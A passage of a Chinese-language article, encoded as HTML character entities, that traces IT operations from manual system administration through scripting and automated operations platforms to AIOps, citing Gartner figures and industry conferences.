SA&#xFF0C;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#xFF1B;&#x901A;&#x8FC7;&#x96C7;&#x4F63;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x8FD0;&#x7EF4;&#x590D;&#x6742;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#xFF0C;&#x4E00;&#x822C;&#x8EAB;&#x517C;&#x591A;&#x804C;&#xFF0C;&#x4EBA;&#x6570;&#x4E5F;&#x4E0D;&#x592A;&#x591A;&#xFF0C;&#x662F;&#x5F53;&#x65F6;&#x4E1A;&#x754C;&#x6BD4;&#x8F83;&#x666E;&#x904D;&#x7684;&#x505A;&#x6CD5;&#x3002;&#x4F46;&#x968F;&#x7740;&#x7CFB;&#x7EDF;&#x53D8;&#x5F97;&#x8D8A;&#x6765;&#x8D8A;&#x590D;&#x6742;&#xFF0C;&#x7EC4;&#x4EF6;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF0C;&#x7528;&#x6237;&#x6D41;&#x7A0B;&#x4E0D;&#x65AD;&#x4E0A;&#x5347;&#xFF0C;&#x9700;&#x8981;&#x516C;&#x53F8;&#x62DB;&#x8058;&#x66F4;&#x591A;&#x7684;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x6765;&#x5E94;&#x5BF9;&#x65E5;&#x76CA;&#x589E;&#x591A;&#x4E8B;&#x4EF6;&#x3002;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x6210;&#x672C;&#x4E0D;&#x65AD;&#x589E;&#x52A0;&#x3002;</p><p><strong>&#x7B2C;&#x4E8C;&#x4E2A;&#x9636;&#x6BB5;</strong>&#xFF0C;&#x811A;&#x672C;&#x5DE5;&#x5177;&#x9636;&#x6BB5;&#xFF0C;&#x4E00;&#x822C;&#x7EDD;&#x5927;&#x591A;&#x6570;&#x4F01;&#x4E1A;&#x90FD;&#x4F1A;&#x5F88;&#x5FEB;&#x4ECE;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x8FC7;&#x6E21;&#x5230;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0A;&#x4E00;&#x9636;&#x6BB5;&#x7684;&#x5927;&#x91CF;&#x91CD;&#x590D;&#x7E41;&#x7410;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5B8C;&#x5168;&#x53EF;&#x4EE5;&#x8F6C;&#x5316;&#x4E3A;&#x811A;&#x672C;&#x6765;&#x5B9E;&#x73B0;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6BCF;&#x6B21;&#x90FD;&#x53BB;&#x6572;&#x4E00;&#x5806;&#x7C7B;&#x4F3C;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x65E9;&#x671F;&#x7684; SA &#x4E3B;&#x8981;&#x4EE5;&#x5404;&#x79CD; shell &#x4E3A;&#x4E3B;&#xFF0C;&#x6240;&#x4EE5;&#x5F88;&#x591A; SA &#x5982;&#x679C;&#x4F1A; shell &#x7F16;&#x5199;&#x4E00;&#x4E9B;&#x6279;&#x5904;&#x7406;&#x811A;&#x672C;&#xFF0C;&#x5C31;&#x4F1A;&#x5F88;&#x6709;&#x7ADE;&#x4E89;&#x529B;&#x4E86;&#x3002;&#x518D;&#x5F80;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5927;&#x5BB6;&#x6240;&#x719F;&#x77E5;&#x7684; Perl&#x3001;Ruby&#x3001;Python &#x7B49;&#x52A8;&#x6001;&#x8BED;&#x8A00;&#x4E5F;&#x88AB;&#x5E7F;&#x6CDB;&#x5E94;&#x7528;&#x4E8E;&#x811A;&#x672C;&#x5DE5;&#x5177;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x4E00;&#x4E9B;&#x903B;&#x8F91;&#x548C;&#x573A;&#x666F;&#x76F8;&#x5BF9;&#x590D;&#x6742;&#x7684;&#x81EA;&#x52A8;&#x5316;&#x5B9E;&#x73B0;&#x3002;</p><p><strong>&#x7B2C;&#x4E09;&#x4E2A;&#x9636;&#x6BB5;</strong>&#xFF0C;&#x6D41;&#x7A0B;&#x548C;&#x5DE5;&#x5177;&#x9636;&#x6BB5;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x628A;&#x4E00;&#x4E9B;&#x590D;&#x6742;&#x7684;&#x64CD;&#x4F5C;&#x5C01;&#x88C5;&#x6210;&#x4E00;&#x4E2A;&#x4E2A;&#x7684;&#x811A;&#x672C;&#x540E;&#xFF0C;&#x6548;&#x7387;&#x786E;&#x5B9E;&#x4F1A;&#x63D0;&#x5347;&#x5F88;&#x591A;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x6240;&#x9762;&#x5BF9;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x548C;&#x4F53;&#x91CF;&#x4E5F;&#x5728;&#x53D8;&#x5F97;&#x66F4;&#x590D;&#x6742;&#x3002;&#x6BD4;&#x5982;&#xFF0C;&#x5BF9;&#x4E8E;&#x8FD0;&#x7EF4;&#x540C;&#x5B66;&#xFF0C;&#x4EE5;&#x524D;&#x5C31;&#x662F;&#x8D1F;&#x8D23;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;&#x4E00;&#x4E0B;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x51E0;&#x5341;&#x53F0;&#x6216;&#x767E;&#x53F0;&#x7684;&#x89C4;&#x6A21;&#xFF0C;&#x811A;&#x672C;&#x6279;&#x91CF;&#x6267;&#x884C;&#x5B8C;&#x5168;&#x53EF;&#x4EE5;&#x641E;&#x5B9A;&#x3002;&#x518D;&#x5F80;&#x540E;&#xFF0C;&#x8FD0;&#x7EF4;&#x8FD8;&#x8981;&#x8D1F;&#x8D23;&#x8F6F;&#x4EF6;&#x7684;&#x9891;&#x7E41;&#x53D1;&#x5E03;&#xFF0C;&#x6BCF;&#x5468;&#x8981;&#x591A;&#x6B21;&#xFF0C;&#x751A;&#x81F3;&#x662F;&#x6BCF;&#x5929;&#x90FD;&#x4F1A;&#x6709;&#xFF0C;&#x8FD9;&#x662F;&#x7531;&#x4E1A;&#x52A1;&#x7279;&#x70B9;&#x51B3;&#x5B9A;&#x7684;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x4E92;&#x8054;&#x7F51;&#x7C7B;&#x578B;&#x7684;&#x4E1A;&#x52A1;&#xFF0C;&#x4E0E;&#x539F;&#x6765;&#x4F20;&#x7EDF;&#x7684;&#x6BCF;&#x4E2A;&#x6708;&#x3001;&#x751A;&#x81F3;&#x51E0;&#x4E2A;&#x6708;&#x53D1;&#x5E03;&#x4E00;&#x6B21;&#x7684;&#x573A;&#x666F;&#x8981;&#x6C42;&#x5B8C;&#x5168;&#x4E0D;&#x4E00;&#x6837;&#x4E86;&#x3002;&#x800C;&#x4E14;&#x968F;&#x7740;&#x7528;&#x6237;&#x4F53;&#x91CF;&#x7684;&#x589E;&#x52A0;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x6570;&#x91CF;&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x5230;&#x4E86;&#x51E0;&#x767E;&#x4E0A;&#x5343;&#x53F0;&#xFF0C;&#x800C;&#x4E14;&#x90E8;&#x7F72;&#x7684;&#x4E1A;&#x52A1;&#x4E5F;&#x4E0D;&#x5C3D;&#x76F8;&#x540C;&#xFF0C;&#x6240;&#x4EE5;&#x5355;&#x7EAF;&#x9760;&#x811A;&#x672C;&#x6267;&#x884C;&#xFF0C;&#x5DF2;&#x7ECF;&#x5B8C;&#x5168;&#x4E0D;&#x80FD;&#x6EE1;&#x8DB3;&#x8981;&#x6C42;&#x3002;&#x8FD9;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x8981;&#x9762;&#x4E34;&#x66F4;&#x52A0;&#x590D;&#x6742;&#x5316;&#x7684;&#x573A;&#x666F;&#x5B9E;&#x73B0;&#xFF0C;&#x6BD4;&#x5982;&#x505A;&#x4E00;&#x6B21;&#x4E1A;&#x52A1;&#x90E8;&#x7F72;&#xFF0C;&#x8FD0;&#x7EF4;&#x540C;&#x5B66;&#x53EF;&#x80FD;&#x8981;&#x5B89;&#x88C5;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x505A;&#x7CFB;&#x7EDF;&#x914D;&#x7F6E;&#x53D8;&#x66F4;&#xFF0C;&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#x5305;&#x3001;&#x542F;&#x505C;&#x8FDB;&#x7A0B;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x4E0A;&#x914D;&#x7F6E;&#x670D;&#x52A1;&#x7B49;&#x7B49;&#x3002;&#x8FD9;&#x65F6;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x6D41;&#x7A0B;&#x5C06;&#x4E00;&#x4E2A;&#x4E2A;&#x7684;&#x811A;&#x672C;&#x529F;&#x80FD;&#x4E32;&#x8054;&#x8D77;&#x6765;&#xFF0C;&#x540C;&#x65F6;&#x8FD8;&#x8981;&#x6709;&#x4E00;&#x4E9B;&#x811A;&#x672C;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x6821;&#x9A8C;&#x53CA;&#x5224;&#x65AD;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x540C;&#x65F6;&#x5BF9;&#x4E8E;&#x7535;&#x4FE1;&#x9886;&#x57DF;&#x5BF9;&#x4EA7;&#x54C1;&#x7684;&#x5347;&#x7EA7;&#x53D8;&#x66F4;&#x6709;&#x4E25;&#x683C;&#x7684;&#x64CD;&#x4F5C;&#x89C4;&#x8303;&#x4EE5;&#x53CA;&#x6D41;&#x7A0B;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x8FD9;&#x5C31;&#x5BF9;&#x6D41;&#x7A0B;&#x548C;&#x5DE5;&#x5177;&#x5E73;&#x53F0;&#x6709;&#x4E86;&#x66F4;&#x5927;&#x7684;&#x8BC9;&#x6C42;&#xFF0C;</p><p><strong>&#x7B2C;&#x56DB;&#x4E2A;&#x9636;&#x6BB5;</strong>&#xFF0C;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0;&#x5316;&#x65E2;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x9636;&#x6BB5;&#xFF0C;&#x4E5F;&#x662F;&#x5F53;&#x524D;&#x6240;&#x5904;&#x9636;&#x6BB5;&#xFF1B;&#x968F;&#x7740;&#x8FD0;&#x7EF4;&#x6D41;&#x7A0B;&#x5316;&#x53D1;&#x5C55;&#xFF0C;&#x8F83;&#x5927;IT&#x516C;&#x53F8;&#x8FDB;&#x4E00;&#x6B65;&#x8FDB;&#x884C;&#x8FD0;&#x7EF4;&#x4F53;&#x7CFB;&#x5316;&#x6539;&#x9020;&#x589E;&#x52A0;&#x81EA;&#x52A8;&#x5316;&#x7A0B;&#x5EA6;&#xFF0C;&#x8FD9;&#x5C31;&#x5230;&#x4E86;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x9636;&#x6BB5;&#xFF0C;&#x5927;&#x516C;&#x53F8;&#x9488;&#x5BF9;&#x81EA;&#x5DF1;&#x4E1A;&#x52A1;&#x7279;&#x5F81;&#x6784;&#x7B51;&#x5927;&#x578B;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0; &#x5982;&#xFF1A;&#x817E;&#x8BAF;&#x6E38;&#x620F;&#x7CFB;&#x7EDF;&#x7684;&#x84DD;&#x9CB8;&#x7CFB;&#x7EDF;&#xFF0C;&#x817E;&#x8BAF;&#x793E;&#x4EA4;&#x9886;&#x57DF;&#x7684;&#x7EC7;&#x4E91;&#x7CFB;&#x7EDF;&#xFF0C;&#x963F;&#x91CC;&#x7535;&#x5546;&#x9886;&#x57DF;&#x7684;&#x9E70;&#x773C;&#x7CFB;&#x7EDF;&#xFF0C;&#x6211;&#x53F8;&#x9488;&#x5BF9;&#x4E91;&#x4E1A;&#x52A1;CloudBU&#x7684;CloudScope&#x7B49;&#x7B49;&#xFF1B;&#x968F;&#x7740;&#x793E;&#x4F1A;&#x5728;&#x7EBF;&#x5316;&#x7684;&#x7A0B;&#x5EA6;&#x4E0D;&#x65AD;&#x63D0;&#x5347;&#xFF0C;&#x5404;&#x5927;&#x4F01;&#x4E1A;&#x4E5F;&#x5F00;&#x59CB;&#x610F;&#x8BC6;&#x5230;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x5BF9;&#x4E8E;&#x4F01;&#x4E1A;&#x7684;&#x6548;&#x7387;&#x3001;&#x7A33;&#x5B9A;&#x548C;&#x6210;&#x672C;&#x6709;&#x7740;&#x51B3;&#x5B9A;&#x6027;&#x4F5C;&#x7528;&#xFF0C;&#x5BF9;&#x8FD0;&#x7EF4;&#x7684;&#x8BC9;&#x6C42;&#x548C;&#x8981;&#x6C42;&#x4E5F;&#x8D8A;&#x6765;&#x8D8A;&#x9AD8;&#x3002;&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x771F;&#x6B63;&#x5730;&#x88AB;&#x91CD;&#x89C6;&#xFF0C;&#x540C;&#x65F6;&#x8FD0;&#x7EF4;&#x884C;&#x4E1A;&#x6709;&#x81EA;&#x5DF1;&#x5782;&#x76F4;&#x7684;&#x6280;&#x672F;&#x5927;&#x4F1A;&#x5982;GOPS&#x5927;&#x4F1A;&#xFF0C;&#x540C;&#x65F6;QCon &#x4EE5;&#x53CA; ArchSummit &#x8FD9;&#x6837;&#x7684;&#x9876;&#x7EA7;&#x6280;&#x672F;&#x5CF0;&#x4F1A;&#xFF0C;&#x5F00;&#x59CB;&#x4E13;&#x95E8;&#x8BBE;&#x7F6E;&#x8FD0;&#x7EF4;&#x4E13;&#x9898;&#x3002;</p><p>&#x7531;&#x6280;&#x672F;&#x4F53;&#x7CFB;&#x53D1;&#x5C55;&#xFF0C;&#x8FD0;&#x7EF4;&#x6240;&#x9762;&#x4E34;&#x7684;&#x573A;&#x666F;&#x590D;&#x6742;&#x5EA6;&#x4E5F;&#x6025;&#x5267;&#x4E0A;&#x5347;&#xFF0C;&#x539F;&#x6709;&#x7684;&#x8FD0;&#x7EF4;&#x6280;&#x80FD;&#x5982;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EF4;&#x62A4;&#x3001;&#x7CFB;&#x7EDF;&#x914D;&#x7F6E;&#x3001;&#x811A;&#x672C;&#x7F16;&#x5199;&#x5DF2;&#x7ECF;&#x5B8C;&#x5168;&#x6EE1;&#x8DB3;&#x4E0D;&#x4E86;&#x8981;&#x6C42;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x8F6F;&#x4EF6;&#x7CFB;&#x7EDF;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x63D0;&#x5347;&#xFF0C;&#x4E5F;&#x9700;&#x8981;&#x8FD0;&#x7EF4;&#x6295;&#x5165;&#x66F4;&#x591A;&#x7684;&#x7CBE;&#x529B;&#x53BB;&#x5173;&#x6CE8;&#x4E1A;&#x52A1;&#x8F6F;&#x4EF6;&#x67B6;&#x6784;&#x548C;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x4E0A;&#x3002;&#x6240;&#x4EE5;&#x5C31;&#x6D6E;&#x73B0;&#x51FA;&#x6211;&#x4EEC;&#x6240;&#x719F;&#x77E5;&#x7684; DevOps&#xFF0C;SRE&#x3001;PE&#x3001;&#x5E94;&#x7528;&#x8FD0;&#x7EF4;&#x3001;&#x6280;&#x672F;&#x8FD0;&#x8425;&#x8FD9;&#x4E9B;&#x65B0;&#x7684;&#x540D;&#x5B57;&#x3001;&#x5C97;&#x4F4D;&#x6216;&#x7406;&#x5FF5;&#x3002;</p><p><strong>&#x7B2C;&#x4E94;&#x4E2A;&#x9636;&#x6BB5;</strong>&#xFF1A;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#x9636;&#x6BB5;&#x6216;AIOps&#xFF0C;&#x968F;&#x7740;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x7B97;&#x6CD5;&#x7A81;&#x7834;&#x3001;&#x8BA1;&#x7B97;&#x80FD;&#x529B;&#x63D0;&#x5347;&#x5982; GPU&#x3001;&#x6D77;&#x91CF;&#x6570;&#x636E;&#x5E26;&#x6765;&#x4E86;AI&#x9769;&#x547D;&#xFF0C;&#x800C;AIOps &#x5C06;&#x4EBA;&#x5DE5;&#x667A;&#x80FD;&#x5E94;&#x7528;&#x4E8E;&#x8FD0;&#x7EF4;&#x9886;&#x57DF;&#xFF0C;&#x57FA;&#x4E8E;&#x5DF2;&#x6709;&#x7684;&#x8FD0;&#x7EF4;&#x6570;&#x636E; (&#x65E5;&#x5FD7;&#x3001;&#x76D1;&#x63A7;&#x4FE1;&#x606F;&#x3001;&#x5E94;&#x7528;&#x4FE1;&#x606F;&#x7B49;)&#xFF0C;&#x901A;&#x8FC7;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8FDB;&#x4E00;&#x6B65;&#x89E3;&#x51B3;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x6240;&#x4E0D;&#x80FD;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x63D0;&#x9AD8;&#x7CFB;&#x7EDF;&#x7684;&#x9884;&#x5224;&#x80FD;&#x529B;&#x3001;&#x7A33;&#x5B9A;&#x6027;&#x3001;&#x964D;&#x4F4E;IT&#x6210;&#x672C;&#xFF0C;&#x5E76;&#x63D0;&#x9AD8;&#x4F01;&#x4E1A;&#x7684;&#x4EA7;&#x54C1;&#x7ADE;&#x4E89;&#x529B;&#x3002;&#x4E0D;&#x8FC7;&#x5F53;&#x524D;&#x4EC5;&#x6709;&#x56FD;&#x5185;&#x5916;&#x7684;&#x5927;&#x5382;&#xFF0C;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x7B97;&#x6CD5;&#x89E3;&#x51B3;&#x5355;&#x70B9;&#x7684;&#x8FD0;&#x7EF4;&#x95EE;&#x9898;&#xFF0C;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#x4E4B;&#x8DEF;&#x4EC5;&#x5904;&#x4E8E;&#x521D;&#x7EA7;&#x9636;&#x6BB5;&#xFF0C;AIOps &#x7684;&#x53D1;&#x5C55;&#x4E00;&#x5B9A;&#x662F;&#x4E00;&#x4E2A;&#x957F;&#x671F;&#x6F14;&#x8FDB;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x540C;&#x65F6;AI &#x662F; Ops &#x7684;&#x6709;&#x529B;&#x8865;&#x5145;&#xFF0C;&#x8FDB;&#x4E00;&#x6B65;&#x964D;&#x4F4E;&#x8FD0;&#x7EF4;&#x7684;&#x5DE5;&#x4F5C;&#x5F3A;&#x5EA6;&#x548C;&#x538B;&#x529B;&#xFF0C;&#x4F46;&#x662F; AIOps &#x4E00;&#x5B9A;&#x5EFA;&#x8BBE;&#x5728;&#x9AD8;&#x5EA6;&#x81EA;&#x52A8;&#x5316;&#x548C;&#x5B8C;&#x5584;&#x7684;&#x8FD0;&#x7EF4;&#x4F53;&#x7CFB;&#x4E4B;&#x4E0A;&#x7684;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x6F14;&#x8FDB;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x4E0D;&#x4F1A;&#x662F;&#x4E00;&#x4E2A;&#x8DF3;&#x8DC3;&#x6027;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x5B8C;&#x5168;&#x98A0;&#x8986;&#x6027;&#x7684; AIOps &#x6A21;&#x5F0F;&#xFF0C;&#x5C06;&#x73B0;&#x6709;&#x7684; Ops &#x4F53;&#x7CFB;&#x66FF;&#x4EE3;&#x6389;&#x3002;</p><p>&#x6BEB;&#x65E0;&#x7591;&#x95EE;&#xFF0C;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x7684;&#x53D1;&#x5C55;&#x5DF2;&#x7ECF;&#x8FDB;&#x5165;&#x4E86;&#x6DF1;&#x6C34;&#x671F;&#x3002;&#x968F;&#x7740;Docker&#x3001;OpenStack&#x3001;Puppet&#x7B49;&#x6280;&#x672F;&#x7684;&#x6D41;&#x884C;&#xFF0C;&#x4EE5;&#x53CA;CI/CD&#x3001;DevOps&#x7B49;&#x7406;&#x5FF5;&#x7684;&#x843D;&#x5730;&#x751F;&#x6839;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x7684;&#x53D1;&#x5C55;&#x8FCE;&#x6765;&#x4E86;&#x5C0F;&#x9AD8;&#x6F6E;&#x3002;&#x6574;&#x4F53;&#x6765;&#x770B;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0;&#x5E2E;&#x52A9;&#x63D0;&#x5347;&#x4E86;&#x8FD0;&#x7EF4;&#x7684;&#x6548;&#x7387;&#xFF0C;&#x5E76;&#x51CF;&#x5C11;&#x4E86;&#x56E0;&#x4EBA;&#x5DE5;&#x548C;&#x6D41;&#x7A0B;&#x64CD;&#x4F5C;&#x800C;&#x5F15;&#x8D77;&#x7684;&#x8FD0;&#x7EF4;&#x6545;&#x969C;&#x3002;</p><p>&#x8BB0;&#x5F97;&#x5728;2001&#x5E74;&#x7684;&#x65F6;&#x5019;&#xFF0C;Gartner Group&#x6709;&#x4E00;&#x4E2A;&#x8C03;&#x67E5;&#x663E;&#x793A;&#x5728;IT&#x9879;&#x76EE;&#x7ECF;&#x5E38;&#x51FA;&#x73B0;&#x7684;&#x95EE;&#x9898;&#x4E2D;&#xFF0C;&#x6E90;&#x81EA;&#x6280;&#x672F;&#x6216;&#x4EA7;&#x54C1;&#xFF08;&#x5305;&#x62EC;&#x786C;&#x4EF6;&#x3001;&#x8F6F;&#x4EF6;&#x3001;&#x7F51;&#x7EDC;&#x3001;&#x7535;&#x529B;&#x5931;&#x5E38;&#x53CA;&#x5929;&#x707E;&#x7B49;&#xFF09;&#x7684;&#x95EE;&#x9898;&#x53EA;&#x5360;20%&#xFF0C;&#x4F46;&#x6D41;&#x7A0B;&#x5931;&#x8BEF;&#x65B9;&#x9762;&#x5374;&#x5360;40%&#xFF0C;&#x4EBA;&#x5458;&#x758F;&#x5931;&#x65B9;&#x9762;&#x4E5F;&#x5360;&#x5230;&#x4E86;40%&#x3002;&#x8FD9;&#x4E9B;&#x5E74;&#x6765;&#xFF0C;&#x4F01;&#x4E1A;&#x901A;&#x8FC7;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0;&#x4EE5;&#x53CA;DevOps&#x7B49;&#x534F;&#x4F5C;&#x7406;&#x5FF5;&#x9010;&#x6B65;&#x89E3;&#x51B3;&#x4E86;Gartner&#x63D0;&#x5230;&#x7684;&#x6D41;&#x7A0B;&#x5931;&#x8BEF;&#x548C;&#x4EBA;&#x5458;&#x758F;&#x5FFD;&#x76F8;&#x5173;&#x7684;80%&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x867D;&#x7136;&#x76EE;&#x524D;&#x6CA1;&#x6709;&#x5177;&#x4F53;&#x7684;&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#xFF0C;&#x4F46;&#x53EF;&#x4EE5;&#x786E;&#x8BA4;&#x7684;&#x662F;&#xFF0C;&#x8FD9;&#x4E00;&#x95EE;&#x9898;&#x5F97;&#x5230;&#x4E86;&#x6709;&#x6548;&#x89E3;&#x51B3;&#x3002;</p><p>&#x4F46;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x70B9;&#x662F;&#x5F53;&#x524D;&#x7684;IT&#x9879;&#x76EE;&#x57FA;&#x7840;&#x8BBE;&#x65BD;&#x73AF;&#x5883;&#x4E0E;5&#x5E74;&#x524D;&#x5DF2;&#x7ECF;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x540C;&#x65E5;&#x800C;&#x8BED;&#xFF0C;&#x66F4;&#x4E0D;&#x7528;&#x8BF4;10&#x5E74;&#x524D;&#x3002;&#x8FD1;&#x51E0;&#x5E74;&#xFF0C;&#x968F;&#x7740;&#x4E91;&#x8BA1;&#x7B97;&#x3001;&#x5FAE;&#x670D;&#x52A1;&#x7B49;&#x6280;&#x672F;&#x7684;&#x6D41;&#x884C;&#xFF0C;&#x4EE5;&#x53CA;&#x4E92;&#x8054;&#x7F51;&#x4E1A;&#x52A1;&#x7684;&#x8FC5;&#x901F;&#x53D1;&#x5C55;&#xFF0C;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x8981;&#x5173;&#x6CE8;&#x7684;&#x670D;&#x52A1;&#x6570;&#x91CF;&#x4E5F;&#x5448;&#x73B0;&#x4E86;&#x6307;&#x6570;&#x7EA7;&#x589E;&#x957F;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x867D;&#x7136;&#x63D0;&#x5347;&#x4E86;&#x6548;&#x7387;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;&#x4E00;&#x90E8;&#x5206;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x4E5F;&#x9047;&#x5230;&#x4E86;&#x65B0;&#x7684;&#x96BE;&#x9898;&#xFF0C;&#x6BD4;&#x5982;&#x9762;&#x5BF9;&#x7E41;&#x591A;&#x7684;&#x62A5;&#x8B66;&#x4FE1;&#x606F;&#xFF0C;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x5E94;&#x8BE5;&#x5982;&#x4F55;&#x5904;&#x7406;&#xFF1F;&#x6545;&#x969C;&#x53D1;&#x751F;&#x65F6;&#xFF0C;&#x53C8;&#x5982;&#x4F55;&#x80FD;&#x591F;&#x8FC5;&#x901F;&#x5B9A;&#x4F4D;&#x95EE;&#x9898;&#xFF1F;</p><p>&#x5F53;&#x4F01;&#x4E1A;&#x9047;&#x5230;&#x8FD9;&#x4E9B;&#x65B0;&#x7684;&#x95EE;&#x9898;&#x5374;&#x65E0;&#x4ECE;&#x4E0B;&#x624B;&#x65F6;&#xFF0C;&#x6070;&#x597D;&#x5386;&#x53F2;&#x8FDB;&#x5165;&#x4E86;&#x4EBA;&#x5DE5;&#x667A;&#x80FD;&#x65F6;&#x4EE3;&#xFF0C;&#x90A3;&#x4E0A;&#x9762;&#x7684;&#x8FD9;&#x4E9B;&#x95EE;&#x9898;&#x53EF;&#x5426;&#x901A;&#x8FC7;&#x300E;AI + Ops&#x300F;&#x7684;&#x8FD9;&#x79CD;&#x8DE8;&#x754C;&#x521B;&#x65B0;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x89E3;&#x51B3;&#x5462;&#xFF1F;&#x4E8E;&#x662F;Gartner&#x5728;2016&#x5E74;&#x65F6;&#x4FBF;&#x63D0;&#x51FA;&#x4E86;AIOps&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x5E76;&#x9884;&#x6D4B;&#x5230;2020&#x5E74;&#xFF0C;AIOps&#x7684;&#x91C7;&#x7528;&#x7387;&#x5C06;&#x4F1A;&#x8FBE;&#x5230;50%&#x3002;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;AIOps&#x5C31;&#x662F;&#x5E0C;&#x671B;&#x57FA;&#x4E8E;&#x5DF2;&#x6709;&#x7684;&#x8FD0;&#x7EF4;&#x6570;&#x636E;&#xFF08;&#x65E5;&#x5FD7;&#x3001;&#x76D1;&#x63A7;&#x4FE1;&#x606F;&#x3001;&#x5E94;&#x7528;&#x4FE1;&#x606F;&#x7B49;&#xFF09;&#x5E76;&#x901A;&#x8FC7;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8FDB;&#x4E00;&#x6B65;&#x89E3;&#x51B3;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x6CA1;&#x529E;&#x6CD5;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#x3002;</p><p>&#x5C31;&#x76EE;&#x524D;&#x6765;&#x770B;&#xFF0C;&#x56FD;&#x5185;&#x7684;&#x767E;&#x5EA6;&#x3001;&#x641C;&#x72D7;&#x3001;&#x5B9C;&#x4FE1;&#x3001;&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x90FD;&#x5DF2;&#x7ECF;&#x63A2;&#x7D22;&#x5C1D;&#x8BD5;&#x4E86;AIOps&#xFF0C;&#x5E76;&#x4E14;&#x53D6;&#x5F97;&#x4E86;&#x4E0D;&#x9519;&#x7684;&#x6536;&#x76CA;&#x3002;&#x5728;2017&#x5E74;InfoQ&#x4E3E;&#x529E;&#x7684;CNUTCon&#x5168;&#x7403;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x5927;&#x4F1A;&#x4E0A;&#xFF0C;&#x4E5F;&#x6709;&#x4E0D;&#x5C11;AIOps&#x76F8;&#x5173;&#x7684;&#x8BAE;&#x9898;&#xFF0C;&#x751A;&#x81F3;&#x4F1A;&#x8BAE;&#x4E3B;&#x9898;&#x4E5F;&#x4ECE;&#x53BB;&#x5E74;&#x7684;&#x5BB9;&#x5668;&#x751F;&#x6001;&#x8FED;&#x4EE3;&#x5230;&#x4ECA;&#x5E74;&#x7684;&#x667A;&#x80FD;&#x65F6;&#x4EE3;&#x7684;&#x65B0;&#x8